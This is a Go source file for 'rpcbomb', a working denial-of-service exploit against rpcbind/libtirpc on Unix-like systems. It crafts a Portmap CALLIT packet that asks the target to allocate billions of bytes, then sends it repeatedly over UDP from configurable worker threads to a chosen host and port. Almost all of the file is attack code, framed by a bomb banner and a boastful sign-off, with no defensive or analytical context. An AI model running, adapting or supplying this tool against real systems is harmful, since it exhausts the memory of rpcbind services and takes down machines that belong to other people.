package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

// Simple Error Checking function
func CheckError(err error) {
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(0)
	}
}

// UPD Connection Handler
func handleUDPConnection(conn *net.UDPConn, payload *bytes.Buffer, threadid int) (int, []byte, *net.UDPAddr, error) {

	_, err := conn.Write(payload.Bytes()) // Send UDP packet to Server
	CheckError(err)                       // Check for errors from sending the packet

	recievebuf := make([]byte, 1024)             // Receive Buffer
	n, addr, err := conn.ReadFromUDP(recievebuf) // wait for response (Or Timeout)
	conn.Close()                                 // Close connection

	if err != nil {
		fmt.Println("\nNo response from server received. Thread ID:", threadid)
	}

	return n, recievebuf, addr, err
}

// Thread Handler
func WorkerThread(id int, numLoops int64, buf *bytes.Buffer, localhost *net.UDPAddr, remotehost *net.UDPAddr, tout int, result chan int) {

	timeoutCount := 0 // Track No response from target

	fmt.Printf("Payload Thread %[2]x: %[1]x\n", buf.Bytes(), id)

	for i := 1; int64(i) <= numLoops; i++ {
		conn, err := net.DialUDP("udp", localhost, remotehost) // setup the connection
		CheckError(err)                                        // Check the error

		timeOut := time.Now().Local().Add(time.Second * time.Duration(tout)) // Set Read timeout (10 Secs) variable
		conn.SetReadDeadline(timeOut)                                        // Set the actual Timeout

		n, bufR, addr, err := handleUDPConnection(conn, buf, id)

		if err != nil {
			timeoutCount++
		}

		if int64(i) == numLoops {
			fmt.Println("\n\nThread:", id, "Report. Status: Success")
			fmt.Printf("Received Messgae: %x", bufR[0:n])
			fmt.Println(" from ", addr)
			fmt.Println("Total Timeouts:", timeoutCount, "\n")
		}

		result <- 1
	}
	close(result)
}

func main() {
	startTime := time.Now() // Store start time

	bomb := `
                                 + # ,
                           : @ @ @ @ @ @
               @ @ ; . + @ @ @ .       @ @
                 @ @ @ @ @             @ @
                                 .     @ #
                     ; @ @ @ . : @ @ @ @
                 @ @ @ @ @ @ @ @ @ @ @ ;
               @ @ @ @ @ @ @ @ @ @ @ @ @
             @ @ @ @ @ @ @ @ @ @ @ @ @ @ :
           # @ @ @ @ @ @ @ @ @ @ @ @ @ '
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @
         . @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ .
         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ +
         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ +
         : @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ :
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ ,
             @ @ @ @ @ @ @ @ @ @ @ @ @
             , @ @ @ @ @ @ @ @ @ @ @
                 @ @ @ @ @ @ @ @ @
                   , @ @ @ @ @

     r p c b o m b
     DoS exploit for *nix rpcbind/libtirpc.
     Based on the work from Guido Vranken.
     https://guidovranken.wordpress.com/

     (c) 2017 Joshua Magady.
	`
	fmt.Println(bomb)

	ptrHost := flag.String("host", "REQUIRED", "This is the target host of the attack (IP Address)") // Create Host Flag
	ptrNumBytes := flag.Int("numbytes", 5999999999, "This the number of bytes to try an allocate")   // create numBytes Flag
	ptrPort := flag.Int("port", 111, "This is the port RPC Bind is running on")                      // create Port Flag
	ptrLoop := flag.Int64("loop", 1, "The number of times to loop (max=9223372036854775807)")        // Create Loop Flag
	ptrThreads := flag.Int("threads", 1, "The number of threads (Workers) to launch the attack")     // Create threads Flag

	flag.Parse() // Parse all Flags

	fmt.Println("Target Host:", *ptrHost)                                // Print Host flag
	fmt.Println("Number of Bytes to allocate (per loop):", *ptrNumBytes) // Print the number of bytes
	fmt.Println("Target Port:", *ptrPort)                                // Print the Port Number

	buf := new(bytes.Buffer)      // Binary Writer Buffer
	byteOrder := binary.BigEndian // Set the Byte Order

	// RPC Byte Code
	binary.Write(buf, byteOrder, uint32(0))            // xid
	binary.Write(buf, byteOrder, uint32(0))            // Message Type: CALL (0)
	binary.Write(buf, byteOrder, uint32(2))            // RPC Version: 2
	binary.Write(buf, byteOrder, uint32(100000))       // Program: Portmap (100000)
	binary.Write(buf, byteOrder, uint32(4))            // Program Version: 4 (old Value: 2)
	binary.Write(buf, byteOrder, uint32(9))            // Procedure: CALLIT (9) (old Value 5)
	binary.Write(buf, byteOrder, uint32(0))            // Credentials Flavor: AUTH_NULL (0)
	binary.Write(buf, byteOrder, uint32(0))            // Length: 0
	binary.Write(buf, byteOrder, uint32(0))            // Credentials Verifier: AUTH_NULL (0)
	binary.Write(buf, byteOrder, uint32(0))            // Length: 0
	binary.Write(buf, byteOrder, uint32(0))            // Program: Unknown (0)
	binary.Write(buf, byteOrder, uint32(0))            // Version: 0 (old Value 1)
	binary.Write(buf, byteOrder, uint32(4))            // Procedure: 4 (old Value 1)
	binary.Write(buf, byteOrder, uint32(4))            // Argument Length
	binary.Write(buf, byteOrder, uint32(*ptrNumBytes)) // Argument (Payload)

	fmt.Printf("Payload: %x\n", buf.Bytes()) // Show Payload that will be sent

	serverAddr, err := net.ResolveUDPAddr("udp", *ptrHost+":"+strconv.Itoa(*ptrPort)) // Resolves the Attack Target
	CheckError(err)                                                                   // Check the error

	localAddr, err := net.ResolveUDPAddr("udp", ":0") // Resolves localhost
	CheckError(err)                                   // Check the error

	loopCount := *ptrLoop / int64(*ptrThreads)
	fmt.Println("Loop Count per Thread:", loopCount)
	status := make(chan int)
	for i := 0; i < *ptrThreads; i++ {

		go WorkerThread(i, int64(loopCount), buf, localAddr, serverAddr, 10, status)

	}

	currentloop := 0
	for loopfin := range status {
		currentloop += loopfin
		now := time.Now()            // Capture the time at this point
		elapse := now.Sub(startTime) // calculate the time difference between now and when the program started

		fmt.Printf("\r Loop %[1]d/%[2]d - Elapsed Time: %[3]v", currentloop, *ptrLoop, elapse)
	}
	fmt.Println("\n\nDamn it feels good to be a gangster.")
}
